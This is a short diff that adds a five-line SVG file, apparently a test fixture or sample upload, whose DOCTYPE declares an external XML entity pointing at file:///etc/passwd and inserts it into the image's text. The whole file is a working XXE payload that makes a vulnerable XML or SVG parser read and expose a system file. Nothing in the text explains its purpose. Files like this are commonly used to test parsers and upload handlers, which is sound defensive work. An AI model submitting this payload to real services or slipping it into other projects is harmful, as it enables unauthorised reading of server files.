@@ -1,0 +1,5 @@
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<svg><text>&xxe;</text></svg>
+
